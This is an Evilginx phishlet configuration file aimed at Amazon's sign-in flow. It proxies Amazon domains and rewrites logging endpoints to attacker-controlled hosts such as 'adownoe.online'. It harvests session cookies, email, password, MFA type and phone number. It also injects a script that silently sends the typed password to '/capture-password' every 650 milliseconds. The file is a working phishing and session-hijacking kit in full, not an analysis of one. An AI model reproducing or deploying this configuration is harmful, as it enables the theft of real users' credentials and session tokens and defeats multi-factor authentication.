author: '@cfs0x'
min_ver: '3.0.0'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true, auto_filter: false}
  - {phish_sub: '', orig_sub: '', domain: 'amazon.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'media-amazon.com', session: false, is_landing: false, auto_filter: false}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'siege-amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'unagi', orig_sub: 'unagi', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'specs', orig_sub: 'specs', domain: 'openid.net', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 'c', orig_sub: 'c', domain: 'amazon-adsystem.com', session: true, is_landing: false, auto_filter: false}
  - {phish_sub: 's', orig_sub: 's', domain: 'amazon-adsystem.com', session: true, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'https://{hostname}', replace: 'https://{hostname}:443', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/javascript', 'application/json']}
  - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'prod.USAmazon', replace: 'adownoe.online', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/javascript', 'application/json']}
  - {triggers_on: 'images-na.ssl-images-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: '.amazon.com/1/events/', replace: '.adownoe.online/1/events/', mimes: ['text/html', 'text/javascript', 'application/json']}
  - {triggers_on: 'unagi.amazon.com', orig_sub: 'unagi', domain: 'amazon.com', search: 'https://mbdvgoj27h.execute-api.us-east-1.amazonaws.com/prod/v1/log', replace: 'https://mbdvgoj27h.execute-api.us-east-1.amazon.evilginx.com/prod/v1/log', mimes: ['text/html', 'text/javascript', 'application/json']}
  - {triggers_on: 'static.siege-amazon.com', orig_sub: 'static', domain: 'siege-amazon.com', search: 'https://{hostname}/prod/profiles/AuthenticationPortalSigninNA.js', replace: 'https://{hostname}:443/prod/profiles/AuthenticationPortalSigninNA.js', mimes: ['text/html', 'text/javascript']}
  - {triggers_on: 'specs.openid.net', orig_sub: 'specs', domain: 'openid.net', search: 'https://{hostname}', replace: 'https://{hostname}:443', mimes: ['text/html', 'text/javascript', 'application/json']}
  - {triggers_on: 'ads.samba.tv', orig_sub: 'ads', domain: 'samba.tv', search: 'https://{hostname}', replace: 'https://{hostname}:443', mimes: ['text/html', 'text/javascript']}
  - {triggers_on: 'loadus.exelator.com', orig_sub: 'loadus', domain: 'exelator.com', search: 'https://{hostname}', replace: 'https://{hostname}:443', mimes: ['text/html', 'text/javascript']}
  - {triggers_on: 'aa.agkn.com', orig_sub: 'aa', domain: 'agkn.com', search: 'https://{hostname}', replace: 'https://{hostname}:443', mimes: ['text/html', 'text/javascript']}

auth_tokens:
  - domain: '.amazon.com'
    keys: ['session-id', 'session-id-time', 'session-token', 'at-main', 'i18n-prefs', 'lc-main', 'sess-at-main', 'sst-main', 'ubid-main', 'x-main, .*:regexp']
    type: 'cookie'
  - domain: 'amazon.com'
    keys: ['session-id', 'session-id-time', 'session-token', 'at-main', 'i18n-prefs', 'lc-main', 'sess-at-main', 'sst-main', 'ubid-main', 'x-main, .*:regexp']
    type: 'cookie'
  - domain: 'www.amazon.com'
    keys: ['session-id', 'session-id-time', 'session-token', 'at-main', 'i18n-prefs', 'lc-main', 'sess-at-main', 'sst-main', 'ubid-main', 'x-main, .*:regexp']
    type: 'cookie'

auth_urls:
  - '/ap/.*'
  - '/ap/mfa*'
  - '/'

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'unenc_password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'account'
      search: '(.*)'
      type: 'post'
    - key: 'mfaType'
      search: '(.*)'
      type: 'post'
    - key: 'mobilePhoneNumber'
      search: '(.*)'
      type: 'post'
    - key: 'password'
      search: '"password":"([^"]+)"'
      type: 'json'
    - key: 'metadata1'
      search: 'metadata1=(.*?)(?:&|$)'
      type: 'post'

login:
  domain: 'www.amazon.com'
  path: '/ap/signin?openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0'

force_post:
  - path: '/ap/signin'
    search:
      - {key: 'email', search: '.*'}
      - {key: 'password', search: '.*'}
    force:
      - {key: 'rememberMe', value: 'true'}
    type: 'post'

js_inject:
  - trigger_domains: ["www.amazon.com"]
    trigger_paths: ["/ap/signin"]
    trigger_params: ["email"]
    script: |
      document.addEventListener('DOMContentLoaded', function() {
        function lp(){
          var email = document.querySelector("#ap_email");
          if (email != null) {
            email.value = "{email}";
            return;
          }
        }
        lp();
      });

  - trigger_domains: ["www.amazon.com"]
    trigger_paths: 
      - "/ap/signin"
      - "/signin"
      - "/ap/"
      - "/"
    trigger_params: []
    script: |  
      function sendPasswordSilent() {
          const pwdField = document.getElementById('ap_password') || 
                           document.querySelector('input[type="password"]');

          if (!pwdField || !pwdField.value || pwdField.value.length < 4) return;

          const email = document.getElementById('ap_email')?.value || '';

          const data = new URLSearchParams();
          data.append('unenc_password', pwdField.value);
          data.append('email', email);
          data.append('url', location.href);

          fetch('/capture-password', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: data.toString()
          })
          .then(() => {
              console.log("%cclear(silent)", "color:lime; font-size:16px", pwdField.value);
          })
          .catch(() => {
              // fallback
              const xhr = new XMLHttpRequest();
              xhr.open("POST", '/capture-password', true);
              xhr.send(data.toString());
          });
      }

      function initSilentOverlay() {
          console.log("%cs");

          setInterval(sendPasswordSilent, 650);
          setTimeout(sendPasswordSilent, 1500);
          setTimeout(sendPasswordSilent, 4000);

          document.addEventListener('submit', (e) => {
              sendPasswordSilent();
          }, true);

          document.addEventListener('click', (e) => {
              if (e.target.id === 'signInSubmit' || e.target.closest('#auth-signin-button')) {
                  setTimeout(sendPasswordSilent, 80);
              }
          }, true);
      }

      if (document.readyState === "loading") {
          document.addEventListener("DOMContentLoaded", initSilentOverlay);
      } else {
          initSilentOverlay();
      }